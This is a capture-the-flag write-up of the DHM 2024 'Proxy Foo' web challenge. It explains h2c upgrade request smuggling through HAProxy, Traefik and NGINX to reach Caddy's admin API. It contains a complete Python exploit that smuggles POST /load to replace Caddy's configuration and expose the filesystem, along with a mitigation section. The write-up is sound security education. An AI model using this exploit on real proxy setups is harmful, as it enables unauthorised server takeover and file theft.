---
ctf: DHM
title: Proxy Foo
description: One reverse proxy is never enough. The more the better, right?
categories:
    - Web
difficulty: Medium
ctf_year: 2024
event_url: https://hacking-meisterschaft.de/
challengefiles: proxy-foo
published: "2024-07-27"
---

# TL;DR

- **Challenge setup:** Requests pass through **HAProxy**, **Traefik**, and **NGINX** before reaching a **Caddy** web server.
- **Key discovery:** An `h2c` upgrade makes **HAProxy** tunnel later `HTTP/2` requests without rewriting their destination host.
- **Vulnerability:** **NGINX** uses that host to choose where to send the request, including **Caddy's** local admin API.
- **Exploitation:** Replace **Caddy's** configuration through `POST /load`.

# Introduction

Although I wasn't able to successfully exploit this challenge during the competition due to the lack of time, this one was a lot of fun and as I barely knew request smuggling before I learned a lot along the way, especially due to `h2c` request smuggling being a quite neat technique.
The challenge gives us a **Docker Compose** setup for a small website behind three reverse proxies served by a 4th proxy.
A reverse proxy can inspect or change a client's request before forwarding it, so those proxies give us enough attack surface to analyze even though the served page itself is not exploitable.

# Reconnaissance

The **Docker Compose** configuration puts all four containers on the same host network.
Requests follow [HAProxy](https://www.haproxy.org/) `:1024` &#x279C; [Traefik](https://traefik.io/traefik) `:2048` &#x279C; [NGINX](https://nginx.org/) `:4096` &#x279C; [Caddy](https://caddyserver.com/) `:8192`.
**Caddy** initially answers every path with `Nothing to see here`.
**Caddy's** Dockerfile copies the flag to `/flag.txt`, so we need to make **Caddy** serve that file.

The relevant part of `haproxy.cfg` is:

```haproxy
frontend http
    bind *:1024
    mode http
    acl known_host hdr(host) -i -m reg ^[0-9a-f]+-1024-proxy-foo.challenges.dhm-ctf.de
    http-request deny unless known_host
    use_backend nginx

backend nginx
    mode http
    http-request set-header Host 127.0.0.1:8192
    server nginx1 127.0.0.1:2048
```

**HAProxy** listens on `:1024` in `HTTP` mode.
Its `known_host` rule reads the incoming `Host` header with `hdr(host)` and checks it against the challenge hostname pattern.
The `http-request deny unless known_host` rule rejects a request with another `Host`, such as `127.0.0.1:2019`.

For an accepted request, `http-request set-header Host 127.0.0.1:8192` replaces the client's `Host` before forwarding it.
The `rule: ClientIP(127.0.0.1)` configuration of **Traefik** sees **HAProxy's** loopback connection as `127.0.0.1` and forwards the request to **NGINX** on `:4096`.

**NGINX** uses `proxy_pass http://$http_host`, taking its destination from the `Host` header it receives.
With **HAProxy's** rewrite, that destination is supposed to be **Caddy's** public site on `:8192`.
In the remote challenge setup only the **HAProxy** was exposed, so this is the only entrypoint we have.

# Vulnerability Description

**Caddy's** admin API listens on `localhost:2019`, as described in its [API documentation](https://github.com/caddyserver/website/blob/07c51663ab3cf37c8831eefeb64383a10af3a4a5/src/docs/markdown/api.md#L5-L11).
Because the containers share the host network with `network_mode: host`, **NGINX** can reach that port.
If we can make **NGINX** forward a request there, we could use [`POST /load`](https://github.com/caddyserver/website/blob/07c51663ab3cf37c8831eefeb64383a10af3a4a5/src/docs/markdown/api.md#L63-L83) to replace **Caddy's** running configuration and make it serve `/flag.txt`.
An ordinary request cannot select the admin port as **HAProxy** checks the `Host` header and rewrites accepted requests to `127.0.0.1:8192`.

This is where request smuggling comes in.
Request smuggling makes a backend process a request that a frontend did not inspect as a normal `HTTP` request.
Classic [**CL/TE smuggling**](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) relies on the two components disagreeing about body boundaries:
`Content-Length` gives a byte count, while `Transfer-Encoding: chunked` marks the body with chunks.
Bytes one component treats as a body can become a new request to the other.
However this challenge exploits a different form of request smuggling by leveraging protocol upgrades.

[Bishop Fox's article](https://bishopfox.com/blog/h2c-smuggling-request) describes a highly interesting `h2c` technique.
`h2c` means `HTTP/2` over a cleartext connection, as defined in [RFC 7540](https://www.rfc-editor.org/rfc/rfc7540#section-3.1).
It lets a proxy or service use `HTTP/2` features such as concurrent requests on a hop without `TLS`, for example between internal services behind a `TLS` frontend.
Here **HAProxy** opens such a connection to **Traefik** on `:2048`; the attacker needs the `h2c` upgrade to make **Traefik** switch to `HTTP/2` and **HAProxy** tunnel the later requests.

The client first sends an `HTTP/1.1` request with `Upgrade: h2c`, `HTTP2-Settings`, and `Connection: Upgrade, HTTP2-Settings`.
`Upgrade: h2c` proposes an `HTTP/2` switch, `HTTP2-Settings` supplies its initial settings, and `Connection` identifies both as connection-specific headers.
[RFC 7540](https://www.rfc-editor.org/rfc/rfc7540#section-3.2) allows a server to handle the request without switching protocols.
As [Andreas Karis's article](https://andreaskaris.github.io/blog/networking/haproxy-and-h2c/) explains, **HAProxy** cannot perform this upgrade as the `HTTP/2` endpoint, so it does not generate the `101` itself.
The `known_host` rule in `haproxy.cfg` denies a request only when its initial `Host` fails the hostname check, but no rule rejects `Upgrade: h2c`.
With a matching `Host`, **HAProxy** rewrites that header and forwards the `HTTP/1.1` request and its upgrade headers to **Traefik**.
**Traefik** accepts the upgrade and replies with `101 Switching Protocols`.
As the [HAProxy manual](https://docs.haproxy.org/2.7/configuration.html#1.3) explains, a `101` response switches **HAProxy** into tunnel mode.
It relays **Traefik's** response and then passes bytes in both directions without parsing them as new `HTTP` requests.
The `http-request set-header Host` rule therefore runs on the initial upgrade request, but not on the later `HTTP/2` frames.

<figure class="markdown-figure">
  <img src="ctf/writeups/dhm/proxyfoo/h2c_upgrade.png" alt="The h2c upgrade passes through HAProxy to Traefik, followed by HTTP/2 requests through HAProxy's tunnel" title="h2c upgrade through HAProxy and Traefik" width="1470" height="1070" loading="lazy" decoding="async">
  <figcaption>The client builds up the <code>HTTP/2</code> tunnel with <strong>Traefik</strong> by using the <code>h2c</code> upgrade - Adapted from <a href="https://raw.githubusercontent.com/BishopFox/h2csmuggler/7ea573a9b13bfce6d0f5d4a96a82e637a9dafe2e/media/diagram.png">Bishop Fox's original diagram</a></figcaption>
</figure>

With the local setup we can even test which proxy exactly sends `101` by sending the same upgrade request to each local port:

```python
import socket

settings = "AAMAAABkAARAAAAAAAIAAAAA"
for port, host in (
    (1024, "deadbeef-1024-proxy-foo.challenges.dhm-ctf.de"),
    (2048, "127.0.0.1:8192"),
    (4096, "127.0.0.1:8192"),
):
    request = (
        f"GET / HTTP/1.1\r\nHost: {host}\r\n"
        "Connection: Upgrade, HTTP2-Settings\r\n"
        "Upgrade: h2c\r\n"
        f"HTTP2-Settings: {settings}\r\n\r\n"
    )
    with socket.create_connection(("127.0.0.1", port), timeout=5) as sock:
        sock.sendall(request.encode("ascii"))
        with sock.makefile("rb") as reply:
            print(f":{port}", reply.readline().decode("ascii").strip())
```

As **HAProxy** on `:1024` and **Traefik** on `:2048` both answer with `101 Switching Protocols` but not **NGINX** on `4096`, it is clear that **Traefik** is responsible for the protocol switch.
`AAMAAABkAARAAAAAAAIAAAAA` is a [base64url-encoded HTTP/2 SETTINGS payload](https://www.rfc-editor.org/rfc/rfc7540#section-3.2.1).
Its 18 decoded bytes contain three six-byte settings.
They set `MAX_CONCURRENT_STREAMS = 100`, `INITIAL_WINDOW_SIZE = 1,073,741,824` bytes (1 GiB per stream), and `ENABLE_PUSH = 0` (no server push).

# Exploitation

After the `101`, **HAProxy** relays bytes without inspecting the new tunneled requests.
The client sends `HTTP/2` frames through that tunnel to **Traefik**, which decodes them and makes separate requests to **NGINX**.
The supplied `traefik/config.yml` uses `http://127.0.0.1:4096`, so that backend connection uses `HTTP/1.1`.

For the tunneled request, we set `:method` to `POST`, `:path` to `/load`, and `:authority` to `127.0.0.1:2019`.
The `:authority` value becomes the `Host` header on **Traefik's** `HTTP/1.1` request because its [`passHostHeader` setting](https://github.com/traefik/traefik/blob/v3.0.4/docs/content/routing/services/index.md#L485-L489) defaults to `true`.
**NGINX** therefore receives `Host: 127.0.0.1:2019` and uses it for `proxy_pass`.
This sends the request to **Caddy's** admin API.

During the competition I tried to adapt [Bishop Fox's h2cSmuggler](https://github.com/BishopFox/h2csmuggler/blob/7ea573a9b13bfce6d0f5d4a96a82e637a9dafe2e/h2csmuggler.py#L174-L217) but it took too much time.
For `POST /load`, we must send the complete `Caddyfile` as the request body with `Content-Type: text/caddyfile`.
[Caddy's API documentation](https://github.com/caddyserver/website/blob/07c51663ab3cf37c8831eefeb64383a10af3a4a5/src/docs/markdown/api.md#L63-L83) notes that its newlines need to be preserved.
This new `Caddyfile` keeps the site on `:8192` but serves files from `/`, where `flag.txt` is placed:

```caddyfile
{
    auto_https off
}

:8192 {
    root * /
    file_server
}
```

This `Caddyfile` fits in one `HTTP/2` `DATA` frame.
The script below reads the `Caddyfile` as bytes and uses `hyper-h2`, which is the Python package for `h2`, to create and parse `HTTP/2` frames.
`socket` and `ssl` carry them over the network.
[ALPN](https://www.rfc-editor.org/rfc/rfc7301) (Application-Layer Protocol Negotiation) lets an `HTTPS` client and the `TLS` endpoint agree on a protocol during their handshake.
For an `HTTPS` frontend, the script advertises only `http/1.1` so its first request can include `Upgrade: h2c`.
If the endpoint selected `h2`, it would expect `HTTP/2` frames immediately.
The `h2c` upgrade itself happens later on the cleartext connection from **HAProxy** to **Traefik**.
After receiving `101`, the script sends the `HTTP/2` preface, reads the response on stream 1, and then sends `POST /load` on stream 3 with the Caddyfile in a `DATA` frame.

To test the script against the local setup, use `http://127.0.0.1:1024/` instead of a `TLS` challenge frontend.
This can be achieved by adding a local hostname ACL beside `known_host` in the `haproxy.cfg` and replace its existing deny line with these lines:

```haproxy
acl local_test_host hdr(host) -i 127.0.0.1
http-request deny unless known_host or local_test_host
```

The exploit script can then be started with `python exploit.py 'https://<challenge-host>/' Caddyfile` for an HTTPS frontend, or `python exploit.py http://127.0.0.1:1024/ Caddyfile` after making the local ACL change above (you can even add a self-signed certificate as a third argument):

```python
#!/usr/bin/env python3
"""Load a Caddyfile through Proxy Foo's h2c tunnel."""

import socket
import ssl
import sys
from pathlib import Path
from urllib.parse import urlsplit

from h2.config import H2Configuration
from h2.connection import H2Connection
from h2.events import DataReceived, ResponseReceived, StreamEnded


def response(sock, h2, stream):
    status = None
    body = bytearray()
    while True:
        data = sock.recv(65535)
        if not data:
            raise RuntimeError("HTTP/2 connection closed")
        for event in h2.receive_data(data):
            if isinstance(event, ResponseReceived) and event.stream_id == stream:
                status = dict(event.headers)[":status"]
            elif isinstance(event, DataReceived):
                h2.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                if event.stream_id == stream:
                    body.extend(event.data)
            elif isinstance(event, StreamEnded) and event.stream_id == stream:
                sock.sendall(h2.data_to_send())
                return status, bytes(body)
        sock.sendall(h2.data_to_send())


if len(sys.argv) not in (3, 4):
    raise SystemExit("Usage: python exploit.py FRONT_URL Caddyfile [CA_CERT]")
url = urlsplit(sys.argv[1])
if url.scheme not in {"http", "https"} or not url.hostname:
    raise SystemExit("FRONT_URL must start with http:// or https://")
caddyfile = Path(sys.argv[2]).read_bytes()
context = ssl.create_default_context(cafile=sys.argv[3] if len(sys.argv) > 3 else None)
context.set_alpn_protocols(["http/1.1"])
port = url.port or (443 if url.scheme == "https" else 80)
raw = socket.create_connection((url.hostname, port), timeout=10)
sock = context.wrap_socket(raw, server_hostname=url.hostname) if url.scheme == "https" else raw

with sock:
    h2 = H2Connection(H2Configuration(client_side=True, header_encoding="utf-8"))
    settings = h2.initiate_upgrade_connection().decode("ascii")
    request = (
        f"GET {url.path or '/'} HTTP/1.1\r\n"
        f"Host: {url.hostname}\r\n"
        "Connection: Upgrade, HTTP2-Settings\r\n"
        "Upgrade: h2c\r\n"
        f"HTTP2-Settings: {settings}\r\n\r\n"
    )
    sock.sendall(request.encode("ascii"))

    headers = bytearray()
    while not headers.endswith(b"\r\n\r\n"):
        byte = sock.recv(1)
        if not byte:
            raise RuntimeError("connection closed before upgrade")
        headers.extend(byte)
    if not headers.startswith(b"HTTP/1.1 101 "):
        raise RuntimeError(headers.decode("ascii", "replace"))

    sock.sendall(h2.data_to_send())
    response(sock, h2, 1)  # The upgrade request becomes stream 1.

    stream = h2.get_next_available_stream_id()
    h2.send_headers(stream, [
        (":method", "POST"),
        (":scheme", "http"),
        (":authority", "127.0.0.1:2019"),
        (":path", "/load"),
        ("content-type", "text/caddyfile"),
    ])
    h2.send_data(stream, caddyfile, end_stream=True)
    sock.sendall(h2.data_to_send())
    status, body = response(sock, h2, stream)
    print(f"POST /load: HTTP {status}")
    if status != "200":
        raise RuntimeError(body.decode("utf-8", "replace"))
```


On successfully running the script we can simply retrieve the flag from `https://<challenge-host>/flag.txt`.

# Mitigation

Reject `Upgrade: h2c` at the front proxy when the site does not need it.
[Bishop Fox recommends](https://bishopfox.com/blog/h2c-smuggling-request) allowing only the upgrade types the application uses.
Moreover harden the setup by configuring **NGINX** with a fixed upstream instead of routing to `$http_host`, and keep **Caddy's** admin API out of reach of the public request path.
